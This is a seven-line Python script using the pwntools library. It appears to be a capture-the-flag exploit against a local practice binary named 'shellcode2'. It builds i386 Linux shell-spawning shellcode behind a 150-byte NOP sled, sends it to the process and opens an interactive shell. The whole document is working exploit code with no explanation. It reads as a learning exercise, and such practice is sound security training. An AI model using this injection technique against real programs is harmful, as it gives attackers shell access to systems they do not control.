from pwn import *
s = process('./shellcode2')
raw_input('debug')
shellcode = asm(shellcraft.i386.linux.sh())
payload = '\x90'*150+shellcode
s.sendline(payload)
s.interactive()
